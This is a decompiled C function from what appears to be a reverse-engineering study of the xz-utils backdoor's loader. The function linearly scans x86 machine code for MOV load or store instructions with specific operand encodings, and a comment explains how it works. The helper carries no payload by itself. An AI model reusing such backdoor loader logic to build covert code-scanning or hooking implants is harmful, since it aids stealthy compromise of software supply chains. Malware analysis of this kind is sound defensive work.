// /home/kali/xzre-ghidra/xzregh/100E00_find_mov_instruction.c
// Function: find_mov_instruction @ 0x100E00
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_mov_instruction(u8 * code_start, u8 * code_end, BOOL is_64bit_operand, BOOL load_flag, dasm_ctx_t * dctx)


/*
 * AutoDoc: MOV-only variant of the pointer scan.
 * It linearly decodes instructions, requires the ModRM bits to encode the loader’s expected register↔memory form, enforces the 64-bit width test when `is_64bit_operand` is TRUE (again waived for stores), and then matches the opcode against either the load (`0x10b`) or store (`0x109`) flavor depending on `load_flag`.
 * Successful matches stop the sweep immediately with `dctx` describing the MOV; failures either advance by the instruction size or peg forward one byte when decoding fails.
 */

#include "xzre_types.h"

BOOL find_mov_instruction
               (u8 *code_start,u8 *code_end,BOOL is_64bit_operand,BOOL load_flag,dasm_ctx_t *dctx)

{
  BOOL BVar1;
  long lVar2;
  dasm_ctx_t *pdVar3;
  BOOL bVar4;
  dasm_ctx_t scratch_ctx;
  
  pdVar3 = &scratch_ctx;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *(undefined4 *)&pdVar3->instruction = 0;
    pdVar3 = (dasm_ctx_t *)((long)&pdVar3->instruction + 4);
  }
  if (dctx == (dasm_ctx_t *)0x0) {
    dctx = &scratch_ctx;
  }
  do {
    while( TRUE ) {
      if (code_end <= code_start) {
        return FALSE;
      }
      BVar1 = x86_dasm(dctx,code_start,code_end);
      if (BVar1 != FALSE) break;
      code_start = code_start + 1;
    }
    if ((((dctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000) &&
       (((((dctx->prefix).decoded.rex.rex_byte & 0x48) == 0x48) == is_64bit_operand ||
        (load_flag == FALSE)))) {
      if (load_flag == FALSE) {
        bVar4 = *(int *)(dctx->opcode_window + 3) == 0x109;
      }
      else {
        bVar4 = *(int *)(dctx->opcode_window + 3) == 0x10b;
      }
      if (bVar4) {
        return TRUE;
      }
    }
    code_start = code_start + dctx->instruction_size;
  } while( TRUE );
}

